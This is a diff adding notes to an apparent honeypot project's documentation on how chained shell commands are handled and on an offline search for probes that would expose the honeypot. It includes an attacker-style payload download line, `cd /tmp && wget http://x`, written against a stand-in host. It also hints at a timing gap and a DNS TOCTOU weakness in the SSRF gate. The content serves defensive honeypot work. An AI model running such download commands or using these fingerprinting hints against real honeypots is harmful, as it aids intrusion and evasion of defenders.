@@ -484,6 +484,23 @@ What survived is `scripts/routing_report.py`, the measurement built to
 evaluate the planner. It found the piped-command gap that became this
 week's most valuable fix, and now gates against that regressing.
 
+- **Chained commands are split, but not fully parsed.** `;`, `&&` and `||`
+  are honoured with real conditional semantics — `cd /tmp || cd /var/run`
+  runs only the first, as bash does — and each segment goes through the
+  ladder independently, so `cd /tmp && wget http://x` both changes
+  directory and captures the payload. What is *not* modelled: command
+  substitution, redirection, subshells, and backgrounding. A segment
+  containing those declines to the model rather than being executed
+  locally, so the failure mode is "narrated" rather than "wrong".
+- **`scripts/probe_search.py` proves presence, not absence.** It searches
+  for the shortest command sequence that exposes the honeypot, offline and
+  deterministically, and gates CI across all 96 behaviour configurations.
+  A clean run means no detector exists *within its hand-written probe
+  alphabet at that depth* — the alphabet inherits our blind spots, exactly
+  as `routing_report` inherited the fastpath's. It also cannot see timing:
+  the offline harness collapses the 1-10ms vs 300-2000ms gap that jitter
+  only partly masks.
+
 ## Known security caveats
 
 - **DNS TOCTOU in the SSRF gate.** `cowrie.core.network.communication_allowed(host)`
